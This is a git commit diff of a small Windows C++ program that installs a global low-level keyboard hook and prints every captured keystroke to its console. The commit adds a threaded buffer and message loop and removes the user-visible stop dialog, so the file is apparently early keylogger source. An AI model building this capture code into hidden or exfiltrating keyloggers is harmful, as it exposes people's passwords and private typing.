c5e55e61d2bb8847a0edc647b3b1754055cd3de6
WhoAmI-FK <Faismen2004@mail.ru>
2022-04-27 19:32:52 +0200

    pre-make

--- WinApi.cpp
+++ WinApi.cpp
@@ -1,11 +1,46 @@
 ﻿#include <iostream>
 #include <Windows.h>
+#include <thread>
+#include <mutex>
+#include <queue>
+std::mutex buffer_lock;
+
+std::queue<DWORD> buffer_queue;
+std::vector<DWORD> thread_buffer;
+bool time_to_stop = false;
+
+void buffer_get_from_queue()
+{
+	std::lock_guard<std::mutex> guard(buffer_lock);
+	while (!buffer_queue.empty())
+	{
+		thread_buffer.push_back(buffer_queue.front());
+		buffer_queue.pop();
+	}
+}
+
+void buffer_log_to_screen()
+{
+
+	thread_buffer.clear();
+}
+
+void buffer_clear_Method()
+{
+	while (!time_to_stop) {
+		Sleep(1000);
+		buffer_get_from_queue();
+		buffer_log_to_screen();
+	};
+}
+
 
 LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
 	PKBDLLHOOKSTRUCT p = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
 	if (wParam == WM_KEYDOWN) 
 	{
+		std::lock_guard<std::mutex> guard(buffer_lock);
 		std::cout << char(tolower(p->vkCode));
 	}
 	return CallNextHookEx(NULL,nCode, wParam, lParam);
@@ -13,17 +48,36 @@ LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
 
 int main()
 {
-	SetWindowsHookEx(
+	thread_buffer.reserve(1000);
+	HHOOK hook=SetWindowsHookEx(
 	WH_KEYBOARD_LL,
 	keyboardHookProc,
 	NULL,
 	0
 	);
-	MessageBox(NULL, TEXT("PRESS OK to stop logging."), TEXT("Information"), MB_OK);
-	/*while (true)
+
+/*	MessageBox(NULL, TEXT("PRESS OK to stop logging."), TEXT("Information"), MB_OK); */
+	/*
+	while (true)
 	{
 
 	}
 	*/
+	
+	if (hook == NULL) {
+		return 1;
+	}
+
+	std::thread worker_thread(buffer_clear_Method);
+	MSG Msg;
+	while (GetMessage(&Msg, NULL, 0, 0) > 0) {
+		TranslateMessage(&Msg);
+		DispatchMessage(&Msg);
+		/*if (Msg.wParam == WM_KEYDOWN) {
+			break;
+		}
+		*/
+	}
+	worker_thread.join();
 	return 0;
 }
